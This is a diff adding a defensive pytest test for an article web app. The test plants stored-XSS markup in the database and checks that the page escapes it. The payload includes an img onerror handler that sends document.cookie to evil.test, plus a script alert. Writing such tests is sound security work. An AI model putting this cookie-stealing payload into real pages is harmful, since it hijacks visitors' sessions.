@@ -272,6 +272,42 @@ def test_index_links_to_ask_page(client):
     assert 'id="ask-form"' not in r.text
 
 
+def test_article_page_escapes_html_reaching_the_db(client, tmp_path):
+    """Second line of defence for the article page.
+
+    Ingest strips HTML on the way in, so stored corpus text should never
+    carry markup. This covers the rows that arrive some other way — a
+    hand-written import, a migration, a downstream tool — because the
+    template renders this content with ``|safe``.
+    """
+    import sqlite3 as _sqlite3
+
+    poisoned = (
+        "可辨識的正常內文\n\n"
+        '<img src=x onerror="fetch(`https://evil.test/?c=`+document.cookie)">\n\n'
+        "<script>alert(document.domain)</script>\n"
+    )
+    # The client fixture snapshots populated_db into this file at setup, so the
+    # write has to land in the file the app actually reads.
+    conn = _sqlite3.connect(str(tmp_path / "wenji.db"))
+    aid = conn.execute("SELECT article_id FROM articles_meta LIMIT 1").fetchone()[0]
+    conn.execute("UPDATE articles_fts SET content_raw = ? WHERE article_id = ?", (poisoned, aid))
+    # Chunked articles render chunk_text_html instead, which would make every
+    # assertion below pass without the payload ever reaching a renderer.
+    conn.execute("UPDATE articles_meta SET chunk_count = 0 WHERE article_id = ?", (aid,))
+    conn.commit()
+    conn.close()
+
+    body = client.get(f"/article/{aid}").text
+    assert "可辨識的正常內文" in body, "payload must actually be rendered, else this proves nothing"
+    # Substring checks on words like "onerror" would trip over the escaped
+    # text itself; what matters is that no live element was emitted.
+    assert "<img" not in body
+    assert "<script>alert(" not in body
+    assert "&lt;img" in body, "payload should survive as visible, inert text"
+    assert "&lt;script&gt;" in body
+
+
 def test_aggregate_page_renders(client):
     """0.6.1: 文章彙整 is a standalone page, mirroring /ask."""
     r = client.get("/aggregate")
